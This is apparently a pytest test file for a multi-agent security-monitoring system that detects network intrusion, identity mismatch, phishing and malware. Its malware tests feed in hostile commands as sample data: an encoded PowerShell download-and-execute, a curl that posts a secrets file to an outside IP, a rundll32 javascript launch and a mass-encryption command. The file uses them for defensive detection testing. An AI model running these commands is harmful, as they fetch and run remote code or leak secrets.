import pytest

from core.event_bus import EventBus
from core.events import (
    ThreatEvent, AgentFinding, ThreatType, Severity, ResponseAction,
)


class TestCyberThreatAgent:
    @pytest.fixture
    def agent(self, event_bus):
        from agents.cyber_threat_agent import CyberThreatAgent
        return CyberThreatAgent(event_bus)

    @pytest.mark.asyncio
    async def test_can_handle(self, agent):
        event = ThreatEvent(
            source="test", threat_type=ThreatType.NETWORK_INTRUSION,
            severity=Severity.HIGH,
            payload={"signature": "SQL_INJECTION", "src_ip": "10.0.0.1", "dst_port": 443, "packet_rate": 100},
        )
        assert agent.can_handle(event) is True

    @pytest.mark.asyncio
    async def test_cannot_handle_identity(self, agent):
        event = ThreatEvent(
            source="test", threat_type=ThreatType.IDENTITY_MISMATCH,
            severity=Severity.MEDIUM, payload={},
        )
        assert agent.can_handle(event) is False

    @pytest.mark.asyncio
    async def test_analyse_network_intrusion(self, agent, threat_event):
        finding = await agent.analyse(threat_event)
        assert finding is not None
        assert finding.agent_name == "CyberThreatAgent"
        assert finding.confidence > 0.5
        assert ResponseAction.ALERT_DASHBOARD in finding.actions

    @pytest.mark.asyncio
    async def test_analyse_with_critical_signature(self, agent, make_threat_event):
        event = make_threat_event(
            source="ids",
            threat_type=ThreatType.NETWORK_INTRUSION,
            severity=Severity.MEDIUM,
            signature="RCE_EXPLOIT",
            src_ip="192.168.1.100",
            dst_port=443,
            packet_rate=500,
        )
        finding = await agent.analyse(event)
        assert finding is not None
        assert finding.confidence > 0.7
        assert ResponseAction.ISOLATE_ASSET in finding.actions or ResponseAction.PSEUDO_LOCK in finding.actions

    @pytest.mark.asyncio
    async def test_insider_threat_analysis(self, agent, make_threat_event):
        event = make_threat_event(
            source="dlp",
            threat_type=ThreatType.INSIDER_THREAT,
            severity=Severity.MEDIUM,
            user_id="insider_user",
            unusual_data_volume_gb=50,
            destination="external_usb",
            time_of_day="02:00",
        )
        finding = await agent.analyse(event)
        assert finding is not None
        assert finding.confidence > 0.7
        assert ResponseAction.REVOKE_IDENTITY in finding.actions

    @pytest.mark.asyncio
    async def test_encrypted_traffic_analysis(self, agent, make_threat_event):
        event = make_threat_event(
            source="network_sensor",
            threat_type=ThreatType.NETWORK_INTRUSION,
            severity=Severity.MEDIUM,
            src_ip="10.0.0.1",
            dst_port=443,
            dst_ip="203.0.113.5",
            data_volume_gb=15,
            packet_rate=100,
        )
        finding = await agent.analyse(event)
        assert finding is not None

    @pytest.mark.asyncio
    async def test_honeypot_detection(self, agent, make_threat_event):
        event = make_threat_event(
            source="network_sensor",
            threat_type=ThreatType.NETWORK_INTRUSION,
            severity=Severity.MEDIUM,
            src_ip="10.0.0.5",
            dst_ip="192.168.99.50",
            dst_port=22,
            packet_rate=50,
        )
        finding = await agent.analyse(event)
        assert finding is not None

    @pytest.mark.asyncio
    async def test_private_ip_check(self, agent):
        assert agent._is_private_ip("10.0.0.1") is True
        assert agent._is_private_ip("192.168.1.1") is True
        assert agent._is_private_ip("172.16.0.1") is True
        assert agent._is_private_ip("127.0.0.1") is True
        assert agent._is_private_ip("8.8.8.8") is False
        assert agent._is_private_ip("203.0.113.1") is False


class TestIdentityVerificationAgent:
    @pytest.fixture
    def agent(self, event_bus):
        from agents.identity_agent import IdentityVerificationAgent
        return IdentityVerificationAgent(event_bus)

    @pytest.mark.asyncio
    async def test_can_handle(self, agent):
        event = ThreatEvent(
            source="test", threat_type=ThreatType.IDENTITY_MISMATCH,
            severity=Severity.HIGH, payload={},
        )
        assert agent.can_handle(event) is True

    @pytest.mark.asyncio
    async def test_identity_mismatch_detection(self, agent, make_threat_event):
        event = make_threat_event(
            source="idp",
            threat_type=ThreatType.IDENTITY_MISMATCH,
            severity=Severity.HIGH,
            user_id="user123",
            biometric_score=0.3,
            claimed_location="office_nyc",
            detected_location="remote_vpn",
        )
        finding = await agent.analyse(event)
        assert finding is not None
        assert finding.confidence > 0.5
        assert ResponseAction.REVOKE_IDENTITY in finding.actions

    @pytest.mark.asyncio
    async def test_low_risk_identity(self, agent, make_threat_event):
        event = make_threat_event(
            source="idp",
            threat_type=ThreatType.IDENTITY_MISMATCH,
            severity=Severity.LOW,
            user_id="user456",
            biometric_score=0.95,
            claimed_location="office_nyc",
            detected_location="office_nyc",
        )
        finding = await agent.analyse(event)
        assert finding is not None
        assert finding.confidence < 0.6

    @pytest.mark.asyncio
    async def test_risk_level_mapping(self, agent):
        assert agent._risk_score_to_level(0.95) == "critical"
        assert agent._risk_score_to_level(0.8) == "high"
        assert agent._risk_score_to_level(0.5) == "medium"
        assert agent._risk_score_to_level(0.2) == "low"


class TestSurveillanceAgent:
    @pytest.fixture
    def agent(self, event_bus):
        from agents.surveillance_agent import SurveillanceAgent
        return SurveillanceAgent(event_bus)

    @pytest.mark.asyncio
    async def test_can_handle(self, agent):
        event = ThreatEvent(
            source="camera", threat_type=ThreatType.PHYSICAL_INTRUSION,
            severity=Severity.HIGH, payload={},
        )
        assert agent.can_handle(event) is True

    @pytest.mark.asyncio
    async def test_physical_intrusion_detection(self, agent, make_threat_event):
        event = make_threat_event(
            source="camera",
            threat_type=ThreatType.PHYSICAL_INTRUSION,
            severity=Severity.MEDIUM,
            zone="server_room",
            face_match=False,
            badge_scan=False,
            motion_anomaly_score=0.9,
        )
        finding = await agent.analyse(event)
        assert finding is not None
        assert finding.confidence > 0.5
        assert ResponseAction.LOCK_ZONE in finding.actions
        assert ResponseAction.ESCALATE_SOC in finding.actions

    @pytest.mark.asyncio
    async def test_authorized_access(self, agent, make_threat_event):
        event = make_threat_event(
            source="camera",
            threat_type=ThreatType.PHYSICAL_INTRUSION,
            severity=Severity.LOW,
            zone="public_lobby",
            face_match=True,
            badge_scan=True,
            motion_anomaly_score=0.1,
        )
        finding = await agent.analyse(event)
        assert finding is not None
        assert finding.confidence < 0.5

    @pytest.mark.asyncio
    async def test_critical_zone_escalation(self, agent, make_threat_event):
        event = make_threat_event(
            source="camera",
            threat_type=ThreatType.PHYSICAL_INTRUSION,
            severity=Severity.MEDIUM,
            zone="data_vault",
            face_match=True,
            badge_scan=False,
            motion_anomaly_score=0.3,
        )
        finding = await agent.analyse(event)
        assert finding is not None
        assert finding.severity == Severity.CRITICAL


class TestPseudoLockAgent:
    @pytest.fixture
    def agent(self, event_bus):
        from agents.pseudo_lock_agent import PseudoLockAgent
        return PseudoLockAgent(event_bus)

    @pytest.mark.asyncio
    async def test_register_subscribes_to_findings(self, agent):
        agent.register()
        assert AgentFinding in agent.bus._subscribers

    @pytest.mark.asyncio
    async def test_pseudo_lock_triggered(self, agent):
        finding = AgentFinding(
            agent_name="CyberThreatAgent",
            event_id="evt_lock",
            threat_type=ThreatType.NETWORK_INTRUSION,
            severity=Severity.CRITICAL,
            confidence=0.9,
            summary="test lock",
            actions=[ResponseAction.PSEUDO_LOCK, ResponseAction.LOG],
            metadata={"raw_payload": {"src_ip": "10.0.0.1", "dst_port": 443}},
        )
        await agent._handle_finding(finding)
        locks = agent.active_locks()
        assert len(locks) > 0
        assert "decoy" in locks[0].decoy_endpoint

    @pytest.mark.asyncio
    async def test_pseudo_lock_not_triggered_without_action(self, agent, make_finding):
        finding = make_finding(
            agent_name="TestAgent",
            confidence=0.5,
            actions=[ResponseAction.LOG],
        )
        await agent._handle_finding(finding)
        assert len(agent.active_locks()) == 0

    @pytest.mark.asyncio
    async def test_restore_lock(self, agent):
        finding = AgentFinding(
            agent_name="CyberThreatAgent",
            event_id="evt_restore",
            threat_type=ThreatType.NETWORK_INTRUSION,
            severity=Severity.CRITICAL,
            confidence=0.9,
            summary="test restore",
            actions=[ResponseAction.PSEUDO_LOCK],
            metadata={"raw_payload": {"src_ip": "10.0.0.1", "dst_port": 80}},
        )
        await agent._handle_finding(finding)
        lock_id = list(agent._lock_registry.keys())[0]
        result = await agent.restore(lock_id)
        assert result is True
        assert agent._lock_registry[lock_id].restored is True

    @pytest.mark.asyncio
    async def test_restore_nonexistent_lock(self, agent):
        result = await agent.restore("nonexistent")
        assert result is False

    @pytest.mark.asyncio
    async def test_can_handle_returns_false(self, agent, threat_event):
        assert agent.can_handle(threat_event) is False

    @pytest.mark.asyncio
    async def test_analyse_returns_none(self, agent, threat_event):
        result = await agent.analyse(threat_event)
        assert result is None


class TestPhishingDetectionAgent:
    @pytest.fixture
    def agent(self, event_bus):
        from agents.phishing_agent import PhishingDetectionAgent
        return PhishingDetectionAgent(event_bus)

    @pytest.mark.asyncio
    async def test_can_handle(self, agent):
        for tt in (ThreatType.NETWORK_INTRUSION, ThreatType.ANOMALOUS_BEHAVIOR, ThreatType.INSIDER_THREAT):
            event = ThreatEvent(source="t", threat_type=tt, severity=Severity.LOW, payload={})
            assert agent.can_handle(event) is True

    @pytest.mark.asyncio
    async def test_detects_phishing_url(self, agent, make_threat_event):
        event = make_threat_event(
            source="email",
            threat_type=ThreatType.NETWORK_INTRUSION,
            severity=Severity.MEDIUM,
            user_id="victim@corp.com",
            urls=["http://g00gle.com/login"],
            subject="Urgent: Account Suspended",
            body="Dear user, your account has been compromised. Click here to verify.",
            sender="security@g00gle.com",
        )
        finding = await agent.analyse(event)
        assert finding is not None
        assert finding.confidence > 0.3

    @pytest.mark.asyncio
    async def test_clean_email_returns_none(self, agent, make_threat_event):
        event = make_threat_event(
            source="email",
            threat_type=ThreatType.NETWORK_INTRUSION,
            severity=Severity.LOW,
            user_id="user@corp.com",
            urls=["https://legitimate.com/page"],
            subject="Weekly Report Attached",
            body="Here is the weekly report as requested.",
            sender="colleague@corp.com",
        )
        finding = await agent.analyse(event)
        assert finding is None

    @pytest.mark.asyncio
    async def test_suspicious_tld_detected(self, agent, make_threat_event):
        event = make_threat_event(
            source="email", threat_type=ThreatType.NETWORK_INTRUSION,
            severity=Severity.MEDIUM, user_id="user@corp.com",
            urls=["http://malicious-site.tk/login"],
            subject="Alert", body="Click here now!", sender="admin@malicious.tk",
        )
        finding = await agent.analyse(event)
        assert finding is not None
        assert finding.confidence >= 0.3

    @pytest.mark.asyncio
    async def test_lookalike_domain(self, agent, make_threat_event):
        event = make_threat_event(
            source="email", threat_type=ThreatType.NETWORK_INTRUSION,
            severity=Severity.MEDIUM, user_id="user@corp.com",
            urls=["http://www.paypa1.com/login"],
            subject="Payment Required", body="Your payment is due.",
            sender="billing@paypa1.com",
        )
        finding = await agent.analyse(event)
        assert finding is not None

    @pytest.mark.asyncio
    async def test_url_shortener(self, agent, make_threat_event):
        event = make_threat_event(
            source="email", threat_type=ThreatType.NETWORK_INTRUSION,
            severity=Severity.MEDIUM, user_id="user@corp.com",
            urls=["https://bit.ly/3xyzabc"],
            subject="Check this", body="Look at this file.",
            sender="friend@example.com",
        )
        finding = await agent.analyse(event)
        assert finding is not None

    @pytest.mark.asyncio
    async def test_phishing_keywords_detected(self, agent, make_threat_event):
        event = make_threat_event(
            source="email", threat_type=ThreatType.NETWORK_INTRUSION,
            severity=Severity.LOW, user_id="user@corp.com",
            urls=["https://example.com"],
            subject="Verify your account immediately",
            body="Your account has been suspended due to unusual activity.",
            sender="security@example.com",
        )
        finding = await agent.analyse(event)
        assert finding is not None

    @pytest.mark.asyncio
    async def test_url_with_ip_address(self, agent, make_threat_event):
        event = make_threat_event(
            source="email", threat_type=ThreatType.NETWORK_INTRUSION,
            severity=Severity.MEDIUM, user_id="user@corp.com",
            urls=["http://192.168.1.1/admin"],
            subject="Alert", body="Action required.", sender="admin@internal",
        )
        finding = await agent.analyse(event)
        assert finding is not None

    @pytest.mark.asyncio
    async def test_non_https_url(self, agent, make_threat_event):
        event = make_threat_event(
            source="email", threat_type=ThreatType.NETWORK_INTRUSION,
            severity=Severity.MEDIUM, user_id="user@corp.com",
            urls=["http://example.com/login"],
            subject="Login", body="Please login.",
            sender="admin@example.com",
        )
        finding = await agent.analyse(event)
        assert finding is not None

    @pytest.mark.asyncio
    async def test_empty_urls_list(self, agent, make_threat_event):
        event = make_threat_event(
            source="email", threat_type=ThreatType.NETWORK_INTRUSION,
            severity=Severity.LOW, user_id="user@corp.com",
            urls=[],
            subject="Hello", body="How are you?",
            sender="friend@corp.com",
        )
        finding = await agent.analyse(event)
        assert finding is None


class TestMalwareAnalysisAgent:
    @pytest.fixture
    def agent(self, event_bus):
        from agents.malware_agent import MalwareAnalysisAgent
        return MalwareAnalysisAgent(event_bus)

    @pytest.mark.asyncio
    async def test_can_handle(self, agent):
        for tt in (ThreatType.NETWORK_INTRUSION, ThreatType.ANOMALOUS_BEHAVIOR, ThreatType.MEMORY_THREAT):
            event = ThreatEvent(source="t", threat_type=tt, severity=Severity.LOW, payload={})
            assert agent.can_handle(event) is True

    @pytest.mark.asyncio
    async def test_known_malware_hash(self, agent, make_threat_event):
        event = make_threat_event(
            source="endpoint",
            threat_type=ThreatType.NETWORK_INTRUSION,
            severity=Severity.MEDIUM,
            user_id="user1",
            file_hash="4d1c8e5f3a2b9c7d6e0f8a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d",
            hash_type="sha256",
            filename="important.docm",
        )
        finding = await agent.analyse(event)
        assert finding is not None
        assert finding.confidence > 0.5
        assert ResponseAction.QUARANTINE_FILE in finding.actions or ResponseAction.ISOLATE_ASSET in finding.actions

    @pytest.mark.asyncio
    async def test_clean_hash_high_confidence(self, agent, make_threat_event):
        event = make_threat_event(
            source="endpoint", threat_type=ThreatType.NETWORK_INTRUSION,
            severity=Severity.LOW, user_id="user1",
            file_hash="e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
            hash_type="sha256", filename="clean_file.txt",
        )
        finding = await agent.analyse(event)
        assert finding is None

    @pytest.mark.asyncio
    async def test_suspicious_extension(self, agent, make_threat_event):
        event = make_threat_event(
            source="endpoint", threat_type=ThreatType.NETWORK_INTRUSION,
            severity=Severity.MEDIUM, user_id="user1",
            filename="invoice.exe", command_line="",
        )
        finding = await agent.analyse(event)
        assert finding is not None

    @pytest.mark.asyncio
    async def test_malicious_command_line(self, agent, make_threat_event):
        event = make_threat_event(
            source="endpoint", threat_type=ThreatType.NETWORK_INTRUSION,
            severity=Severity.MEDIUM, user_id="user1",
            filename="",
            command_line="powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA==",
        )
        finding = await agent.analyse(event)
        assert finding is not None
        assert ResponseAction.TERMINATE_PROCESS in finding.actions

    @pytest.mark.asyncio
    async def test_fileless_threat(self, agent, make_threat_event):
        event = make_threat_event(
            source="endpoint", threat_type=ThreatType.NETWORK_INTRUSION,
            severity=Severity.MEDIUM, user_id="user1",
            filename="",
            command_line="rundll32.exe javascript:\\..\\..\\ProgramData\\malware.dll",
        )
        finding = await agent.analyse(event)
        assert finding is not None

    @pytest.mark.asyncio
    async def test_unknown_file_returns_none(self, agent, make_threat_event):
        event = make_threat_event(
            source="endpoint", threat_type=ThreatType.NETWORK_INTRUSION,
            severity=Severity.LOW, user_id="user1",
            filename="report.pdf",
            file_hash="",
            command_line="",
        )
        finding = await agent.analyse(event)
        assert finding is None

    @pytest.mark.asyncio
    async def test_data_exfil_behavior(self, agent, make_threat_event):
        event = make_threat_event(
            source="endpoint", threat_type=ThreatType.NETWORK_INTRUSION,
            severity=Severity.MEDIUM, user_id="user1",
            filename="",
            command_line="curl http://203.0.113.5/exfil --data @secrets.txt",
        )
        finding = await agent.analyse(event)
        assert finding is not None

    @pytest.mark.asyncio
    async def test_suspicious_process_name(self, agent, make_threat_event):
        event = make_threat_event(
            source="endpoint", threat_type=ThreatType.NETWORK_INTRUSION,
            severity=Severity.LOW, user_id="user1",
            process_name="powershell.exe",
            filename="", command_line="",
        )
        finding = await agent.analyse(event)
        assert finding is not None
        assert finding.confidence > 0.0

    @pytest.mark.asyncio
    async def test_clean_benign_file(self, agent, make_threat_event):
        event = make_threat_event(
            source="endpoint", threat_type=ThreatType.NETWORK_INTRUSION,
            severity=Severity.LOW, user_id="user1",
            filename="document.pdf",
            file_hash="",
            command_line="",
            process_name="explorer.exe",
        )
        finding = await agent.analyse(event)
        assert finding is None

    @pytest.mark.asyncio
    async def test_file_encryption_behavior(self, agent, make_threat_event):
        event = make_threat_event(
            source="endpoint", threat_type=ThreatType.NETWORK_INTRUSION,
            severity=Severity.MEDIUM, user_id="user1",
            filename="", command_line="process.exe --encrypt-all-files C:\\Users\\",
        )
        finding = await agent.analyse(event)
        assert finding is not None
        assert finding.confidence > 0.0
